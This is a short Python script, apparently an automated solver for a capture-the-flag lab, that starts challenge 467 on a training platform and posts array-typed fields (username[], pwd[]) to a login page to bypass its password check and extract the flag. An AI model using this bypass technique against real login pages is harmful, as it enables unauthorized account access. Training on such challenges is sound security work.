import sys, json, re, time, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab

requests.packages.urllib3.disable_warnings()
cy = CyLab(delay=0.8)
cy.login()
cy.req("PUT", "/api/challenges/467/instance/?source=library")
base = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/467/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"http://([A-Za-z0-9.\-]+):(\d+)", d.get("description") or "")
        if m:
            base = m.group(0)
            break
print("base:", base)
if not base:
    sys.exit(0)
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
r = s.get(base + "/impossibleLogin.php", timeout=20)
names = re.findall(r'name="([^"]+)"', r.text)
print("champs du formulaire:", names)
pw_field = "pwd" if "pwd" in names else (names[1] if len(names) > 1 else "password")
for data in (
    {"username[]": "a", pw_field + "[]": "b"},
    {"username": "a", pw_field: "b"},
):
    try:
        r2 = s.post(base + "/impossibleLogin.php", data=data, timeout=20)
        print("\n=== POST %s -> %s (%d o) ===" % (list(data.keys()), r2.status_code, len(r2.text)))
        print(r2.text[:700])
        f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r2.text)
        if f:
            print("FLAG:", f.group(0))
            break
    except Exception as e:
        print("ERR", type(e).__name__)
